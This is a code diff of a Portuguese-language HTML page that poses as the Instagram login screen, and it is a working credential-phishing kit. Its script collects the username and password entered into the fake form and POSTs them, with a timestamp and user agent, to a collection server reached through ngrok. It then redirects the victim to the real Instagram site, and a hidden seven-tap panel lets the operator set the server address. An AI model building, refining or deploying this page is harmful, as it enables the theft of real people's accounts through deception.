@@ -30,7 +30,7 @@
             justify-content: space-between;
             padding: 120px 0 60px 0;
             z-index: 1000;
-            transition: opacity 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: opacity 0.35s ease;
         }
 
         .splash-logo-container {
@@ -43,7 +43,6 @@
         .instagram-splash-icon {
             width: 80px;
             height: 80px;
-            filter: drop-shadow(0 0 8px rgba(252, 175, 69, 0.15));
         }
 
         .from-meta-container {
@@ -57,8 +56,6 @@
             color: #8E8E8E;
             font-size: 13px;
             font-weight: 400;
-            letter-spacing: 0.3px;
-            text-transform: lowercase;
         }
 
         .meta-brand {
@@ -69,22 +66,18 @@
 
         .infinity-icon {
             font-size: 24px;
-            line-height: 1;
             font-weight: 600;
             background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
         }
 
         .meta-text {
             font-size: 20px;
             font-weight: 700;
-            letter-spacing: -0.3px;
             background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
         }
 
         /* ========== LOGIN SCREEN ========== */
@@ -94,7 +87,7 @@
             align-items: center;
             width: 100%;
             height: 100dvh;
-            background-color: #000000;
+            background-color: #000;
             padding: 0 16px;
         }
 
@@ -102,24 +95,16 @@
             width: 100%;
             display: flex;
             justify-content: center;
-            align-items: center;
-            padding: 16px 0 8px 0;
+            padding: 16px 0 8px;
             margin-bottom: 12px;
         }
 
         .language-selector {
             color: #A8A8A8;
             font-size: 14px;
-            font-weight: 400;
             display: flex;
             align-items: center;
             gap: 4px;
-        }
-
-        .language-selector svg {
-            width: 12px;
-            height: 12px;
-            fill: #A8A8A8;
         }
 
         .login-logo-wrapper {
@@ -128,15 +113,15 @@
             justify-content: center;
             margin-bottom: 36px;
             cursor: pointer;
+            pointer-events: auto;
+            z-index: 10;
         }
 
         .instagram-login-icon {
             width: 64px;
             height: 64px;
-            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
         }
 
-        /* Formulário */
         #login-form {
             width: 100%;
             max-width: 358px;
@@ -148,12 +133,10 @@
             border: 0.5px solid #363636;
             border-radius: 12px;
             padding: 14px 16px;
-            color: #FFFFFF;
+            color: #FFF;
             font-size: 14px;
-            font-weight: 400;
             margin-bottom: 10px;
             outline: none;
-            transition: border-color 0.2s ease;
         }
 
         .input-field:focus {
@@ -162,14 +145,12 @@
 
         .input-field::placeholder {
             color: #8E8E8E;
-            font-size: 14px;
-            font-weight: 400;
         }
 
         .login-button {
             width: 100%;
             background: #0095F6;
-            color: #FFFFFF;
+            color: #FFF;
             border: none;
             border-radius: 18px;
             padding: 7px 0;
@@ -178,16 +159,6 @@
             margin-top: 12px;
             margin-bottom: 16px;
             cursor: pointer;
-            transition: background 0.2s ease;
-            line-height: 18px;
-        }
-
-        .login-button:hover {
-            background: #1877F2;
-        }
-
-        .login-button:active {
-            opacity: 0.7;
         }
 
         .forgot-wrapper {
@@ -197,17 +168,11 @@
         }
 
         .forgot-link {
-            color: #FFFFFF;
+            color: #FFF;
             font-size: 14px;
-            font-weight: 500;
             text-decoration: none;
         }
 
-        .forgot-link:active {
-            opacity: 0.7;
-        }
-
-        /* Rodapé */
         .footer-wrapper {
             margin-top: auto;
             width: 100%;
@@ -230,24 +195,11 @@
             text-align: center;
             text-decoration: none;
             margin-bottom: 28px;
-            line-height: 18px;
-            transition: background 0.2s ease;
-        }
-
-        .signup-button:active {
-            background: rgba(0, 149, 246, 0.1);
-        }
-
-        .meta-footer {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0.6;
         }
 
         .meta-footer svg {
             width: 70px;
-            height: auto;
+            opacity: 0.6;
         }
 
         /* Painel de configuração */
@@ -264,7 +216,6 @@
             border: 0.5px solid #363636;
             width: 90%;
             max-width: 350px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
         }
 
         #server-config h3 {
@@ -284,10 +235,6 @@
             font-size: 12px;
             outline: none;
             margin-bottom: 12px;
-        }
-
-        #server-config input:focus {
-            border-color: #0095F6;
         }
 
         .config-buttons {
@@ -311,29 +258,29 @@
             background: #363636;
         }
 
-        /* Indicador de toques (some rápido) */
         #tap-indicator {
             position: fixed;
             bottom: 100px;
             left: 50%;
             transform: translateX(-50%);
-            background: rgba(0,149,246,0.8);
+            background: rgba(0,149,246,0.9);
             color: #FFF;
-            padding: 4px 12px;
+            padding: 6px 16px;
             border-radius: 20px;
-            font-size: 12px;
+            font-size: 13px;
+            font-weight: 600;
             opacity: 0;
             transition: opacity 0.2s;
             z-index: 1999;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
 
-    <!-- Gradientes SVG -->
     <svg style="width:0; height:0; position:absolute;">
         <defs>
-            <linearGradient id="instagramGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+            <linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">
                 <stop offset="0%" stop-color="#833AB4"/>
                 <stop offset="25%" stop-color="#C13584"/>
                 <stop offset="50%" stop-color="#E1306C"/>
@@ -343,16 +290,15 @@
         </defs>
     </svg>
 
-    <!-- SPLASH SCREEN -->
+    <!-- SPLASH -->
     <div id="splash-screen">
         <div class="splash-logo-container">
             <svg class="instagram-splash-icon" viewBox="0 0 24 24" fill="none">
-                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instagramGradient)" stroke-width="2.2" fill="none"/>
-                <circle cx="12" cy="12" r="5.5" stroke="url(#instagramGradient)" stroke-width="2.2" fill="none"/>
-                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instagramGradient)"/>
+                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2" fill="none"/>
+                <circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2" fill="none"/>
+                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#g)"/>
             </svg>
         </div>
-
         <div class="from-meta-container">
             <p class="from-label">from</p>
             <div class="meta-brand">
@@ -362,46 +308,40 @@
         </div>
     </div>
 
-    <!-- LOGIN SCREEN -->
+    <!-- LOGIN -->
     <div id="login-screen">
-        <!-- Idioma -->
         <div class="language-wrapper">
             <div class="language-selector">
                 <span>Português (Brasil)</span>
-                <svg viewBox="0 0 24 24">
+                <svg viewBox="0 0 24 24" width="12" height="12" fill="#A8A8A8">
                     <path d="M7 10l5 5 5-5H7z"/>
                 </svg>
             </div>
         </div>
         
-        <!-- Logo Instagram (7 TOQUES AQUI ABRE CONFIG) -->
-        <div class="login-logo-wrapper" id="secret-logo-trigger">
+        <!-- LOGO CLICÁVEL -->
+        <div class="login-logo-wrapper" onclick="handleLogoTap()">
             <svg class="instagram-login-icon" viewBox="0 0 24 24" fill="none">
-                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instagramGradient)" stroke-width="2.2" fill="none"/>
-                <circle cx="12" cy="12" r="5.5" stroke="url(#instagramGradient)" stroke-width="2.2" fill="none"/>
-                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instagramGradient)"/>
+                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2" fill="none"/>
+                <circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2" fill="none"/>
+                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#g)"/>
             </svg>
         </div>
 
-        <!-- Formulário de Login -->
         <form id="login-form">
-            <input type="text" name="u" class="input-field" placeholder="Nome de usu&#225;rio, email ou celular" autocomplete="off" required>
-            <input type="text" name="p" class="input-field" placeholder="Senha" autocomplete="off" required>
+            <input type="text" name="u" class="input-field" placeholder="Nome de usuário, email ou celular" autocomplete="off">
+            <input type="text" name="p" class="input-field" placeholder="Senha" autocomplete="off">
             <button type="submit" class="login-button">Entrar</button>
         </form>
 
-        <!-- Esqueceu a senha -->
         <div class="forgot-wrapper">
             <a href="#" class="forgot-link">Esqueceu a senha?</a>
         </div>
 
-        <!-- Rodapé -->
         <div class="footer-wrapper">
             <a href="#" class="signup-button">Criar nova conta</a>
-            
-            <!-- Logo Meta -->
             <div class="meta-footer">
-                <svg viewBox="0 0 287 56" fill="white" xmlns="http://www.w3.org/2000/svg">
+                <svg viewBox="0 0 287 56" fill="white">
                     <path d="M55.5 14.5C55.5 14.5 58.5 10 64 10C69.5 10 72 15 72 15L79 4C79 4 73.5 -2 64 2C54.5 6 55.5 14.5 55.5 14.5Z" fill="currentColor"/>
                     <path d="M46 46C46 46 40 52 33 52C26 52 21 47 21 40C21 33 26 28 33 28C40 28 45 33 45 33L38 41C38 41 36 44 33 44C30 44 28 42 28 40C28 38 30 36 33 36C35 36 37 38 37 38L46 46Z" fill="currentColor"/>
                     <path d="M90 52L90 4L98 4L98 52L90 52Z" fill="currentColor"/>
@@ -415,13 +355,13 @@
         </div>
     </div>
 
-    <!-- Indicador de toques -->
+    <!-- INDICADOR DE TOQUES -->
     <div id="tap-indicator">Toques: 0/7</div>
 
-    <!-- Painel de Configuração -->
+    <!-- PAINEL DE CONFIGURAÇÃO -->
     <div id="server-config">
         <h3>⚙️ Configurar Servidor</h3>
-        <input type="text" id="server-url" placeholder="https://seu-ngrok.ngrok-free.app" value="">
+        <input type="text" id="server-url" placeholder="https://seu-ngrok.ngrok-free.app">
         <div class="config-buttons">
             <button onclick="saveServerUrl()">Salvar</button>
             <button class="close-btn" onclick="hideConfig()">Fechar</button>
@@ -429,19 +369,30 @@
     </div>
 
     <script>
-        // ========== CONFIGURAÇÃO DO SERVIDOR ==========
         let SERVER_URL = localStorage.getItem('serveo_url') || '';
+        let tapCount = 0;
+        let tapTimer = null;
         
-        let logoTapCount = 0;
-        let logoTapTimer = null;
-        
-        function showTapIndicator(count) {
+        // FUNÇÃO CHAMADA PELO ONCLICK DO LOGO
+        function handleLogoTap() {
+            tapCount++;
+            
             const indicator = document.getElementById('tap-indicator');
             indicator.style.opacity = '1';
-            indicator.textContent = `Toques: ${count}/7`;
-            setTimeout(() => {
+            indicator.textContent = `Toques: ${tapCount}/7`;
+            
+            clearTimeout(tapTimer);
+            tapTimer = setTimeout(() => { 
+                tapCount = 0; 
                 indicator.style.opacity = '0';
-            }, 500);
+            }, 1500);
+            
+            if (tapCount >= 7) {
+                document.getElementById('server-config').style.display = 'block';
+                document.getElementById('server-url').value = SERVER_URL;
+                tapCount = 0;
+                indicator.style.opacity = '0';
+            }
         }
         
         function saveServerUrl() {
@@ -458,91 +409,53 @@
             document.getElementById('server-config').style.display = 'none';
         }
         
-        // ========== GATILHO: 7 TOQUES NO LOGO ==========
-        document.getElementById('secret-logo-trigger').addEventListener('click', function() {
-            logoTapCount++;
-            showTapIndicator(logoTapCount);
-            
-            clearTimeout(logoTapTimer);
-            logoTapTimer = setTimeout(() => { 
-                logoTapCount = 0; 
-            }, 1500);
-            
-            if (logoTapCount >= 7) {
-                document.getElementById('server-config').style.display = 'block';
-                document.getElementById('server-url').value = SERVER_URL;
-                logoTapCount = 0;
-                document.getElementById('tap-indicator').style.opacity = '0';
-            }
-        });
-        
-        // ========== SPLASH TIMER ==========
-        window.addEventListener('load', function() {
-            const splash = document.getElementById('splash-screen');
-            const login = document.getElementById('login-screen');
-            
-            setTimeout(function() {
-                splash.style.opacity = '0';
-                setTimeout(function() {
-                    splash.style.display = 'none';
-                    login.style.display = 'flex';
+        // SPLASH
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('splash-screen').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('splash-screen').style.display = 'none';
+                    document.getElementById('login-screen').style.display = 'flex';
                 }, 350);
             }, 2200);
         });
         
-        // ========== FORMULÁRIO DE LOGIN ==========
-        document.getElementById('login-form').addEventListener('submit', async function(e) {
+        // FORMULÁRIO
+        document.getElementById('login-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const userField = document.querySelector('input[name="u"]');
-            const passField = document.querySelector('input[name="p"]');
+            const u = document.querySelector('input[name="u"]').value.trim();
+            const p = document.querySelector('input[name="p"]').value.trim();
             
-            const userValue = userField.value.trim();
-            const passValue = passField.value.trim();
-            
-            if (!userValue || !passValue) {
-                return;
-            }
+            if (!u || !p) return;
             
             if (SERVER_URL) {
                 try {
-                    const dados = {
-                        u: userValue,
-                        p: passValue,
-                        t: new Date().toISOString(),
-                        ua: navigator.userAgent
-                    };
-                    
                     await fetch(SERVER_URL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                             'ngrok-skip-browser-warning': 'true'
                         },
-                        body: JSON.stringify(dados)
+                        body: JSON.stringify({
+                            u: u,
+                            p: p,
+                            t: new Date().toISOString(),
+                            ua: navigator.userAgent
+                        })
                     });
-                    
                     await new Promise(r => setTimeout(r, 1000));
-                    
-                } catch (err) {
-                    console.log('Erro ignorado');
-                }
+                } catch (err) {}
             }
             
             window.location.href = 'https://www.instagram.com/reels/';
         });
         
-        // ========== PREVINE NAVEGAÇÃO DOS LINKS ==========
-        document.querySelectorAll('a').forEach(link => {
-            link.addEventListener('click', function(e) {
-                e.preventDefault();
-            });
-        });
+        // LINKS
+        document.querySelectorAll('a').forEach(l => l.addEventListener('click', e => e.preventDefault()));
         
-        // Carrega URL salva
-        if (SERVER_URL) {
-            console.log('[OK] Servidor configurado');
-        }
+        // CARREGAR URL SALVA
+        if (SERVER_URL) console.log('Servidor configurado');
     </script>
 </body>
 </html>
